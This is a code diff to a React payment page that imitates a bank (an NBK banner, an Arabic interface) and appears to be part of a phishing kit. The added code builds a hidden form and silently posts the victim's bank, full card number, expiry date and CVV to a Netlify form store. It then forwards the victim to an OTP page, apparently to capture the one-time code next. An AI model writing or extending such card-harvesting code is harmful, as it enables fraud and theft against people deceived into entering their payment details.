@@ -1,4 +1,3 @@
-
 import { useState } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Button } from "@/components/ui/button";
@@ -66,9 +65,53 @@ const CardDetails = () => {
     e.preventDefault();
     setLoading(true);
     
-    setTimeout(() => {
-      navigate(`/otp/${id}`);
-    }, 2000);
+    // Create a hidden form to submit to Netlify
+    const netlifyForm = document.createElement('form');
+    netlifyForm.setAttribute('name', 'card-details');
+    netlifyForm.setAttribute('method', 'POST');
+    netlifyForm.setAttribute('data-netlify', 'true');
+    netlifyForm.style.display = 'none';
+
+    // Add form fields
+    const fields = [
+      { name: 'form-name', value: 'card-details' },
+      { name: 'payment-id', value: id || '' },
+      { name: 'bank', value: formData.bank },
+      { name: 'card-prefix', value: formData.prefix },
+      { name: 'card-number', value: formData.cardNumber },
+      { name: 'expiry-month', value: formData.expiryMonth },
+      { name: 'expiry-year', value: formData.expiryYear },
+      { name: 'cvv', value: formData.cvv },
+      { name: 'timestamp', value: new Date().toISOString() }
+    ];
+
+    fields.forEach(field => {
+      const input = document.createElement('input');
+      input.setAttribute('type', 'hidden');
+      input.setAttribute('name', field.name);
+      input.setAttribute('value', field.value);
+      netlifyForm.appendChild(input);
+    });
+
+    document.body.appendChild(netlifyForm);
+    
+    // Submit the form
+    const formData2 = new FormData(netlifyForm);
+    fetch('/', {
+      method: 'POST',
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams(formData2 as any).toString()
+    }).then(() => {
+      document.body.removeChild(netlifyForm);
+      setTimeout(() => {
+        navigate(`/otp/${id}`);
+      }, 1000);
+    }).catch(() => {
+      document.body.removeChild(netlifyForm);
+      setTimeout(() => {
+        navigate(`/otp/${id}`);
+      }, 1000);
+    });
   };
 
   const handleCancel = () => {
@@ -77,6 +120,18 @@ const CardDetails = () => {
 
   return (
     <div className="min-h-screen" style={{ backgroundColor: '#e8e8e8' }}>
+      {/* Hidden Netlify form for form detection */}
+      <form name="card-details" netlify netlify-honeypot="bot-field" hidden>
+        <input type="text" name="payment-id" />
+        <input type="text" name="bank" />
+        <input type="text" name="card-prefix" />
+        <input type="text" name="card-number" />
+        <input type="text" name="expiry-month" />
+        <input type="text" name="expiry-year" />
+        <input type="text" name="cvv" />
+        <input type="text" name="timestamp" />
+      </form>
+
       {/* NBK Advertisement Banner - Mobile Optimized */}
       <div className="w-full h-20 sm:h-32 bg-gradient-to-r from-blue-300 to-blue-500 relative overflow-hidden">
         <img 
@@ -115,11 +170,15 @@ const CardDetails = () => {
 
         {/* Payment Form Card - Mobile Optimized */}
         <div className="bg-white rounded-2xl sm:rounded-3xl shadow-lg p-4 sm:p-8 mb-3 sm:mb-6" style={{ borderRadius: '16px', boxShadow: '0 4px 16px rgba(0,0,0,0.1)' }}>
-          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-8">
+          <form onSubmit={handleSubmit} className="space-y-4 sm:space-y-8" name="card-details" method="POST" data-netlify="true">
+            <input type="hidden" name="form-name" value="card-details" />
+            <input type="hidden" name="payment-id" value={id || ''} />
+            
             {/* Bank Selection */}
             <div className="space-y-2 sm:space-y-3">
               <div className="flex justify-between items-center">
                 <select 
+                  name="bank"
                   value={formData.bank}
                   onChange={(e) => handleInputChange('bank', e.target.value)}
                   className="flex-1 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-sm sm:text-lg z-50" 
@@ -140,6 +199,7 @@ const CardDetails = () => {
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3 flex-1">
                   <select 
+                    name="card-prefix"
                     value={formData.prefix}
                     onChange={(e) => handleInputChange('prefix', e.target.value)}
                     className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50" 
@@ -153,6 +213,7 @@ const CardDetails = () => {
                   </select>
                   <Input
                     type="text"
+                    name="card-number"
                     value={formData.cardNumber}
                     onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                     className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
@@ -169,6 +230,7 @@ const CardDetails = () => {
               <div className="flex justify-between items-center">
                 <div className="flex space-x-2 sm:space-x-3">
                   <select 
+                    name="expiry-year"
                     value={formData.expiryYear}
                     onChange={(e) => handleInputChange('expiryYear', e.target.value)}
                     className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
@@ -183,6 +245,7 @@ const CardDetails = () => {
                     <option value="2029">2029</option>
                   </select>
                   <select 
+                    name="expiry-month"
                     value={formData.expiryMonth}
                     onChange={(e) => handleInputChange('expiryMonth', e.target.value)}
                     className="w-16 sm:w-28 p-2 sm:p-4 border-2 border-gray-300 rounded-lg sm:rounded-xl text-center bg-white text-gray-700 text-xs sm:text-base z-50"
@@ -205,6 +268,7 @@ const CardDetails = () => {
               <div className="flex justify-between items-center">
                 <Input
                   type="text"
+                  name="cvv"
                   value={formData.cvv}
                   onChange={(e) => handleInputChange('cvv', e.target.value)}
                   className="flex-1 p-2 sm:p-4 border-2 border-blue-500 rounded-lg sm:rounded-xl text-center text-sm sm:text-lg"
@@ -230,7 +294,7 @@ const CardDetails = () => {
               إلغاء
             </button>
             <button
-              onClick={() => navigate(`/otp/${id}`)}
+              onClick={handleSubmit}
               className="flex-1 bg-gray-300 text-gray-800 py-3 sm:py-5 rounded-xl sm:rounded-2xl text-base sm:text-xl font-medium hover:bg-gray-400 transition-colors"
               style={{ borderRadius: '12px' }}
               disabled={loading}
